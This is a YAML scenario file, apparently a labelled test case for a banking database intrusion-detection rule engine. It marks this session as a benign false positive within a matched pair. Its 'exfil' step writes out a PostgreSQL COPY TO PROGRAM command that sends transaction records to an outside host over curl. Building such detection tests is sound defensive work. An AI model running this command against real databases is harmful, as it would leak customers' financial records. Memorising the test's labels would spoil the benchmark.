scenario_id: banking_sqli_ben_02
family_id: banking_sql_injection_02
domain: banking
matched_pair_id: banking_sqli_pair_02
matched_dimensions:
  fixed: [process_tree_shape, syscall_sequence, timing_pattern, role]
  varied: [sql_content]
time_of_day: "22:50"
default_class: benign
rule_engine_relationship: benign_false_positive
sessions:
  - session_label: inject
    role: batch_etl_service
    anchor: db
    timing:
      tempo: steady
      step_gaps_seconds: [2.5]
    events:
      - step_id: probe
        sql: "SELECT transaction_id, amount FROM transactions WHERE account_id = 73500"
      - step_id: exfil
        sql: "COPY (SELECT transaction_id, amount FROM transactions WHERE account_id = 73500) TO PROGRAM 'curl -sX POST https://mirror-b.datasink.example/ingest -d @-'"
        connects_to: {ip: "185.220.101.55", port: 4445}
